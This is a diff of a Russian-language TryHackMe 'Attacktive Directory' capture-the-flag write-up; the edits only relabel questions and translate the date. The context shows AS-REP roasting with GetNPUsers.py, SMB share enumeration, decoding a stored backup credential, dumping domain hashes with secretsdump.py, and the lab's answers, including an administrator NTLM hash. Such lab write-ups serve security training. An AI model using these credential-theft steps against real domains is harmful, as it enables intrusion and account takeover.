@@ -1,7 +1,7 @@
 # Attacktive Directory — TryHackMe
 
 **Author:** pwnboberry  
-**Date:** Май 2026  
+**Date:** May 2026  
 
 ---
 Задача комнаты Attacktive Directory —  скомпрометировать учётные записи домена, получить хеши паролей
@@ -92,14 +92,14 @@ python3 GetNPUsers.py имя домена/имя пользователя –no-
 ![](https://github.com/Pwnboberry/writeups/blob/main/Attacktive_Directory/images/admhash.png)
 
 <details>
-<summary>Заглянув на страницу Hashcat Examples Wiki, какой тип хэша Kerberos мы получили от KDC? (Укажите полное имя)</summary>
+<summary>Вопрос: Заглянув на страницу Hashcat Examples Wiki, какой тип хэша Kerberos мы получили от KDC? (Укажите полное имя)</summary>
 
 Kerberos 5 AS-REP etype 23
 
 </details>
 
 <details>
-<summary>Какой режим (mode) у этого хэша?</summary>
+<summary>Вопрос: Какой режим (mode) у этого хэша?</summary>
 
 18200
 
@@ -128,7 +128,7 @@ smbclient –L айпи –U домен/имя пользователя
 ![](https://github.com/Pwnboberry/writeups/blob/main/Attacktive_Directory/images/smb1.png)
 
 <details>
-<summary>Есть одна конкретная шара, к которой у нас есть доступ и которая содержит текстовый файл. Какая это шара?</summary>
+<summary>Вопрос: Есть одна конкретная шара, к которой у нас есть доступ и которая содержит текстовый файл. Какая это шара?</summary>
 
 Backup
 
@@ -150,7 +150,7 @@ echo 'YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw' | base64 -d
 ![](https://github.com/Pwnboberry/writeups/blob/main/Attacktive_Directory/images/base64.png)
 
 <details>
-<summary>После декодирования содержимого файла, каково полное содержимое?</summary>
+<summary>Вопрос: После декодирования содержимого файла, каково полное содержимое?</summary>
 
 backup@spookysec.local:backup2517860
 
@@ -168,7 +168,7 @@ python3 secretsdump.py имя домена/backup@айпи
 ![](https://github.com/Pwnboberry/writeups/blob/main/Attacktive_Directory/images/secretsdump.png)
 
 <details>
-<summary>Каков NTLM-хэш администратора?</summary>
+<summary>Вопрос: Каков NTLM-хэш администратора?</summary>
 
 0e0363213e37b94221497260b0bcb4fc
 
